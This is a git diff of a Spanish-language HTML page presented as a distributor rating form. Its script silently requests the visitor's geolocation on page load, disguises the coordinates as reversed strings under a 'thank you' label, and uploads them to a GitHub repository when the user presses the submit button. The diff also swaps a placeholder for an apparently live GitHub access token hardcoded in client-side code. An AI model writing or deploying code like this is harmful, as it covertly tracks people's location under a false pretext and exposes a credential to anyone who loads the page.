@@ -1,105 +1,123 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CALIFICADOR DE DISTRIBUIDOR</title>
-    <script>
-        var ubicacionesRegistradas = [];
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CALIFICADOR DE DISTRIBUIDOR</title>
+  <script>
+    var ubicacionesRegistradas = [];
 
-        window.onload = function() {
-            rastrearUbicacion();
+    window.onload = function () {
+      rastrearUbicacion();
+    };
+
+    function rastrearUbicacion() {
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          var latitud = position.coords.latitude;
+          var longitud = position.coords.longitude;
+          ubicacionesRegistradas.push({ latitud: latitud, longitud: longitud });
+          actualizarListaUbicaciones();
+          enviarUbicacionesAlServidor();
+        },
+        function (error) {
+          console.error("Error al obtener la ubicación:", error);
+        }
+      );
+    }
+
+    function actualizarListaUbicaciones() {
+      var lista = document.getElementById("ubicaciones");
+      lista.innerHTML = "";
+      var inicio = Math.max(0, ubicacionesRegistradas.length - 5);
+      for (var i = inicio; i < ubicacionesRegistradas.length; i++) {
+        var ubicacion = ubicacionesRegistradas[i];
+        var nuevaUbicacion = document.createElement("li");
+        nuevaUbicacion.textContent = "Gracias por sus respuestas";
+        nuevaUbicacion.dataset.latitud = codificarCoordenada(ubicacion.latitud);
+        nuevaUbicacion.dataset.longitud = codificarCoordenada(ubicacion.longitud);
+        nuevaUbicacion.onclick = function () {
+          alert(
+            "Latitud: " +
+              decodificarCoordenada(this.dataset.latitud) +
+              ", Longitud: " +
+              decodificarCoordenada(this.dataset.longitud)
+          );
         };
+        lista.appendChild(nuevaUbicacion);
+      }
+    }
 
-        function rastrearUbicacion() {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                var latitud = position.coords.latitude;
-                var longitud = position.coords.longitude;
-                ubicacionesRegistradas.push({latitud: latitud, longitud: longitud});
-                actualizarListaUbicaciones();
-                enviarUbicacionesAlServidor();
-            }, function(error) {
-                console.error('Error al obtener la ubicación:', error);
-            });
+    function codificarCoordenada(coordenada) {
+      return coordenada.toFixed(4).split("").reverse().join("");
+    }
+
+    function decodificarCoordenada(coordenadaCodificada) {
+      return parseFloat(coordenadaCodificada.split("").reverse().join(""));
+    }
+
+    function enviarUbicacionesAlServidor() {}
+
+    async function descargarUbicaciones() {
+      // ⚠️ Token y repo correctos
+      const token = "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";
+      const repo = "angelos2024/Local-consults";
+      const filePath = `clientes/cliente_${Date.now()}.txt`;
+
+      // Convierte las ubicaciones a texto cifrado
+      const texto = encriptar(JSON.stringify(ubicacionesRegistradas));
+      const contentBase64 = btoa(unescape(encodeURIComponent(texto)));
+
+      // Envío a GitHub API
+      const response = await fetch(
+        `https://api.github.com/repos/${repo}/contents/${filePath}`,
+        {
+          method: "PUT",
+          headers: {
+            Authorization: `Bearer ${token}`,
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            message: "Nuevo cliente registrado",
+            content: contentBase64,
+          }),
         }
+      );
 
-        function actualizarListaUbicaciones() {
-            var lista = document.getElementById("ubicaciones");
-            lista.innerHTML = "";
-            var inicio = Math.max(0, ubicacionesRegistradas.length - 5);
-            for (var i = inicio; i < ubicacionesRegistradas.length; i++) {
-                var ubicacion = ubicacionesRegistradas[i];
-                var nuevaUbicacion = document.createElement("li");
-                nuevaUbicacion.textContent = "Gracias por sus respuestas ";
-                nuevaUbicacion.dataset.latitud = codificarCoordenada(ubicacion.latitud);
-                nuevaUbicacion.dataset.longitud = codificarCoordenada(ubicacion.longitud);
-                nuevaUbicacion.onclick = function() {
-                    alert("Latitud: " + decodificarCoordenada(this.dataset.latitud) + 
-                          ", Longitud: " + decodificarCoordenada(this.dataset.longitud));
-                };
-                lista.appendChild(nuevaUbicacion);
-            }
-        }
+      if (response.ok) {
+        alert("Código generado y subido correctamente a GitHub.");
+      } else {
+        const errorData = await response.json();
+        console.error("Error al subir a GitHub:", errorData);
+        alert("Error al subir el código. Revisa la consola.");
+      }
+    }
 
-        function codificarCoordenada(coordenada) {
-            return coordenada.toFixed(4).split('').reverse().join('');
-        }
-
-        function decodificarCoordenada(coordenadaCodificada) {
-            return parseFloat(coordenadaCodificada.split('').reverse().join(''));
-        }
-
-        function enviarUbicacionesAlServidor() {}
-
-        async function descargarUbicaciones() {
-            const token = "ghp_TU_TOKEN_AQUI"; // tu token
-            const repo = "tu_usuario/clientes"; // tu repo
-            const filePath = `clientes/cliente_${Date.now()}.txt`;
-
-            const texto = encriptar(JSON.stringify(ubicacionesRegistradas));
-            const contentBase64 = btoa(unescape(encodeURIComponent(texto)));
-
-            const response = await fetch(`https://api.github.com/repos/${repo}/contents/${filePath}`, {
-                method: "PUT",
-                headers: {
-                    "Authorization": `Bearer ${token}`,
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    message: "Nuevo cliente registrado",
-                    content: contentBase64
-                })
-            });
-
-            if (response.ok) {
-                alert("Código generado y subido correctamente a GitHub.");
-            } else {
-                const errorData = await response.json();
-                console.error("Error al subir a GitHub:", errorData);
-                alert("Error al subir el código. Revisa la consola.");
-            }
-        }
-
-        function encriptar(texto) {
-            return btoa(texto);
-        }
-    </script>
+    function encriptar(texto) {
+      return btoa(texto);
+    }
+  </script>
 </head>
 <body>
-    <h1>Formulario para Distribuidor</h1>
-    <p>Nombre de Distribuidor:</p>
-    <form><textarea rows="1" cols="35"></textarea><br><br></form>
-    <p>Estado:</p>
-    <form><textarea rows="1" cols="35"></textarea><br><br></form>
-    <p>Ciudad o pueblo:</p>
-    <form><textarea rows="1" cols="35"></textarea><br><br></form>
-    <p>Número telefónico:</p>
-    <form><textarea rows="1" cols="35"></textarea><br><br></form>
-    <p>Calificación de Distribuidor del 1 al 10:</p>
-    <form><textarea rows="1" cols="10"></textarea><br><br></form>
+  <h1>Formulario para Distribuidor</h1>
 
-    <ul id="ubicaciones"></ul>
+  <p>Nombre de Distribuidor:</p>
+  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>
 
-    <button onclick="descargarUbicaciones()">Generar y enviar código</button>
+  <p>Estado:</p>
+  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>
+
+  <p>Ciudad o pueblo:</p>
+  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>
+
+  <p>Número telefónico:</p>
+  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>
+
+  <p>Calificación de Distribuidor del 1 al 10:</p>
+  <form><textarea rows="1" cols="10"></textarea><br /><br /></form>
+
+  <ul id="ubicaciones"></ul>
+
+  <button onclick="descargarUbicaciones()">Generar y enviar código</button>
 </body>
 </html>
